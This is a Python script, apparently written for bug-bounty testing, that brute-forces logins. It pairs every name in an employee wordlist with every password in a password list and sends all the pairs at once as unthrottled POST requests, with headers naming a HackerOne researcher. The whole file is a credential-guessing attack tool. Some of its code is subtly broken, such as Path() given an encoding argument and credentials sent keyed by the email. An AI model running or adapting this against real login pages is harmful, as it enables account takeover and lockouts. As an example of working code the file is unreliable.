import asyncio
import aiohttp

from pathlib import Path


def yield_user_pass_combination():
    with open(Path('../wordlists/employees.list', encoding='utf-8')) as file:
        users = file.read().splitlines()

    with open(Path('../wordlists/passwords.list', encoding='utf-8')) as file:
        passwords = file.read().splitlines()

    for u in users:
        for p in passwords:
            yield u, p


async def send_request(creds, session):
    email, password = creds
    data = {email: password}
    try:
        async with session.post(url='https://httpbin.org/post', data=data) as response:
            resp = await response.read()
            # if len(resp) != 105:
            print(f'Sent for {email}:{password} with resp len: {len(resp)}, {resp.decode('utf-8')}')
    except Exception as e:
        print(f'ERROR occurred for: {email}:{password}', e)


async def main():
    headers = {
        'User-Agent': 'Contact sumbru@wearehackerone.com in case of emergency.',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'X-BugBountyHunter': 'sumbru',
    }
    async with aiohttp.ClientSession(headers=headers, ) as session:
        ret = await asyncio.gather(*(send_request(creds, session) for creds in yield_user_pass_combination()))
    print(f'Finished. Returned a list of {len(ret)} outputs.')


if __name__ == '__main__':
    asyncio.run(main())

